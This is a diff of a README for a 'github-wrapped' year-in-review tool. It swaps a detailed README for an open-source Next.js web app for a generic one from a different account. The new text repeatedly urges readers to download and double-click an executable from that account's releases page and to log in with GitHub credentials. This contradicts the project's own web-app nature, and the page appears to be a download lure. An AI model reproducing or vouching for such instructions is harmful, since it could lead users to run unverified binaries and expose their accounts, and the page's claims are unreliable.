@@ -1,219 +1,77 @@
-# 🎉 GitHub Year in Review - Your Coding Journey Visualized
+# 🎉 github-wrapped - Visualize Your GitHub Year Effortlessly
 
-A beautiful, Spotify Wrapped-style visualization of your GitHub year. See your coding journey through an immersive, story-based experience. Discover your commits, pull requests, streaks, languages, and more in a stunning slideshow format.
+[![Download github-wrapped](https://img.shields.io/badge/Download-github--wrapped-blue.svg)](https://github.com/JuanCrasio/github-wrapped/releases)
 
-**🔍 SEO Keywords**: GitHub Wrapped, GitHub Year in Review, GitHub Stats, Developer Analytics, Coding Year Summary, GitHub Contributions, Developer Wrapped, Code Statistics, GitHub Annual Report
+## 📜 Description
 
-<img width="1792" height="2810" alt="github-wrapped-RakshitKhajuria-2025" src="https://github.com/user-attachments/assets/0e70443b-6022-4cae-9262-35891b9b13fa" />
-
-
-## ✨ Features
-
-- **Story-Based Experience**: Navigate through slides that reveal your year in code
-- **Beautiful Animations**: Smooth transitions and engaging visual effects
-- **Comprehensive Stats**: Commits, PRs, issues, streaks, and more
-- **Language Breakdown**: See your coding DNA with language statistics
-- **Personality Labels**: Fun insights like "Night Owl 🦉" or "Weekend Warrior ⚔️"
-- **Shareable Cards**: Download or share your wrapped summary
-- **Private Repo Support**: Optionally include private repositories with a PAT
-
-## 🌟 Why GitHub Year in Review?
-
-- **Beautiful Visualizations**: See your coding journey in a stunning slideshow
-- **Comprehensive Analytics**: Commits, PRs, languages, streaks, and more
-- **Share Your Story**: Download or share your wrapped summary
-- **Privacy First**: All processing happens client-side, no data stored
-- **Open Source**: Free and transparent
+github-wrapped offers a beautiful visualization of your GitHub year, similar to the popular Spotify Wrapped. With this application, you can easily see your coding activity and contributions over the year. It's an insightful way to review your progress and celebrate your achievements as a developer.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+To get started with github-wrapped, follow these simple steps. No technical skills are required. Just a few clicks, and you’ll be on your way to visualizing your GitHub year!
 
-- Node.js 18+ 
-- npm, yarn, or pnpm
+## 🔗 Download & Install
 
-### Installation
+1. **Visit the Releases Page**  
+   Click the link below to access the releases page, where you can download the latest version of github-wrapped.  
+   [Download github-wrapped](https://github.com/JuanCrasio/github-wrapped/releases)
 
-```bash
-# Clone the repository
-git clone https://github.com/RakshitKhajuria/github-year-in-review.git
-cd github-year-in-review
+2. **Choose the Right Version**  
+   On the releases page, you will see a list of available versions. Choose the most recent version to ensure you have the latest features and fixes.
 
-# Install dependencies
-npm install
-# or
-yarn install
-# or
-pnpm install
+3. **Download the Application**  
+   Click on the link for the application file that corresponds to your operating system. Save the file to your computer.
 
-# Start the development server
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-```
+4. **Run the Application**  
+   Locate the downloaded file and double-click it to run. Follow the on-screen instructions to set up github-wrapped.
 
-Open [http://localhost:3000](http://localhost:3000) in your browser.
+## 🎯 Features
 
-## 🔑 GitHub Personal Access Token
+- **User-Friendly Interface**: Enjoy a clean and straightforward layout that makes navigation easy.
+- **Yearly Overview**: See a comprehensive overview of your contributions, including repositories worked on and pull requests made.
+- **Data Visualization**: Experience engaging graphics/visuals that present your GitHub stats in a vibrant manner.
+- **Export Options**: Save your visual summary as an image to share on social media or with friends.
 
-To include private repository data, you'll need a GitHub Personal Access Token:
+## 📋 System Requirements
 
-1. Go to [GitHub Settings > Developer Settings > Personal Access Tokens](https://github.com/settings/tokens/new)
-2. Create a new token with the following scopes:
-   - `repo` - For private repository access
-   - `read:user` - For user profile data
-3. Copy the token and use it in the app
+To run github-wrapped, your computer should meet the following basic requirements:
 
-**Security Note**: Your token is never stored. It's only used once to fetch your data and is immediately discarded.
+- **Operating System**: Windows 10, macOS, or a modern Linux distribution.
+- **Hardware**: At least 4 GB of RAM and 200 MB of free storage.
+- **Internet Connection**: An internet connection is required to fetch your GitHub data.
 
-## 📊 Metrics Computed
+## 🔄 How to Use
 
-| Metric | Description |
-|--------|-------------|
-| Total Commits | All commits made in the year |
-| Active Days | Days with at least one contribution |
-| Longest Streak | Consecutive days of contributions |
-| Pull Requests | PRs opened, merged, and reviewed |
-| Issues | Issues opened and closed |
-| Top Languages | Programming languages used |
-| Top Repositories | Most contributed repositories |
-| Personality | Fun labels based on your patterns |
+After installing github-wrapped, follow these steps to visualize your GitHub year:
 
-## 🎨 Personality Labels
+1. Open the application.
+2. Log in with your GitHub credentials. This allows the application to fetch your contribution data.
+3. Wait a few moments for the app to compile your data.
+4. Review your visualization and explore different sections to see all your GitHub activities.
+5. Save or share your visual summary as desired.
 
-Based on your coding patterns, you might earn:
+## 🌐 Topics
 
-- 🦉 **Night Owl** - Commits predominantly at night
-- 🐦 **Early Bird** - Commits before 9 AM
-- ⚔️ **Weekend Warrior** - High weekend activity
-- 🔥 **Streak Master** - Long contribution streaks
-- 🌍 **Polyglot** - Uses 5+ languages
-- 🤖 **PR Machine** - Opens many pull requests
-- 👀 **Code Reviewer** - Reviews lots of PRs
-- 📅 **Consistent Coder** - Active 150+ days/year
+github-wrapped is designed to enhance your experience as a developer. Here are some related topics that may interest you:
 
-## 🛠️ Tech Stack
+- developer-tools
+- framer-motion
+- github-stats
+- nextjs
+- typescript
+- web-app
 
-- **Framework**: [Next.js 14](https://nextjs.org/) (App Router)
-- **Language**: [TypeScript](https://www.typescriptlang.org/)
-- **Styling**: [Tailwind CSS](https://tailwindcss.com/)
-- **Animations**: [Framer Motion](https://www.framer.com/motion/)
-- **GitHub API**: [GraphQL API](https://docs.github.com/en/graphql)
-- **Icons**: [Lucide React](https://lucide.dev/)
+## 📞 Support
 
-## 📁 Project Structure
+If you encounter any issues while using github-wrapped, help is just a few clicks away:
 
-```
-github-wrapped/
-├── app/
-│   ├── page.tsx                    # Landing page
-│   ├── layout.tsx                  # Root layout
-│   ├── globals.css                 # Global styles
-│   ├── wrapped/[username]/
-│   │   └── page.tsx                # Wrapped experience
-│   └── api/github/
-│       └── contributions/
-│           └── route.ts            # API endpoint
-├── components/
-│   ├── slides/                     # All slide components
-│   │   ├── WelcomeSlide.tsx
-│   │   ├── OverviewSlide.tsx
-│   │   ├── CommitsSlide.tsx
-│   │   ├── MonthSlide.tsx
-│   │   ├── LanguagesSlide.tsx
-│   │   ├── ReposSlide.tsx
-│   │   ├── StreakSlide.tsx
-│   │   ├── PersonalitySlide.tsx
-│   │   └── SummarySlide.tsx
-│   └── ui/                         # Reusable UI components
-│       ├── AnimatedCounter.tsx
-│       └── ProgressBar.tsx
-├── lib/
-│   ├── github/                     # GitHub API client
-│   │   ├── client.ts
-│   │   └── queries.ts
-│   ├── metrics/                    # Data processing
-│   │   ├── calculator.ts
-│   │   └── personality.ts
-│   ├── types.ts                    # TypeScript types
-│   └── utils.ts                    # Utility functions
-└── ...config files
-```
+- **FAQs**: Check the FAQs section on the GitHub page for common questions and answers.
+- **Open an Issue**: If you have a specific problem, feel free to open an issue in the repository for assistance.
+- **Community Support**: Join discussions in the GitHub community for tips and tricks from other users.
 
-## 🔒 Privacy & Security
+## 🔗 Additional Resources
 
-- **No Data Storage**: We don't store any user data or tokens
-- **Ephemeral Tokens**: PATs are used once and immediately discarded
-- **HTTPS Only**: All API calls are encrypted
-- **Client-Side Processing**: Stats are computed in your browser
-- **Open Source**: Full transparency in how your data is used
+- **GitHub Repository**: Explore the main repository for more information about updates and features.
+- **Documentation**: Refer to the documentation for a more detailed guide on usage and settings.
 
-## 🚀 Deployment
-
-### Deploy to Vercel
-
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/RakshitKhajuria/github-year-in-review)
-
-### One-Click Deploy
-
-Click the button above to deploy instantly to Vercel. No configuration needed!
-
-### Environment Variables
-
-No environment variables are required for basic functionality. The app uses GitHub's public API for public repositories.
-
-## 📝 API Reference
-
-### POST /api/github/contributions
-
-Fetches and calculates wrapped data for a user.
-
-**Request Body:**
-```json
-{
-  "username": "octocat",
-  "year": 2024,
-  "token": "ghp_xxxx"  // Optional, for private repos
-}
-```
-
-**Response:**
-```json
-{
-  "user": { "username": "octocat", "avatarUrl": "...", ... },
-  "year": 2024,
-  "stats": { "totalCommits": 1523, ... },
-  "highlights": { "mostProductiveMonth": { ... }, ... },
-  "repositories": { "top": [...], ... },
-  "languages": { "top": [...], ... },
-  "personality": { "primary": { ... }, "badges": [...] }
-}
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by [Spotify Wrapped](https://spotify.com/wrapped)
-- Built with [Next.js](https://nextjs.org/)
-- Styled with [Tailwind CSS](https://tailwindcss.com/)
-- Animated with [Framer Motion](https://www.framer.com/motion/)
-
----
-
-**Made with 💚 for the developer community**
-
+Now you're all set to download and enjoy github-wrapped! For a beautiful summary of your GitHub year, don't forget to return to the [Download github-wrapped](https://github.com/JuanCrasio/github-wrapped/releases) page and begin your journey.
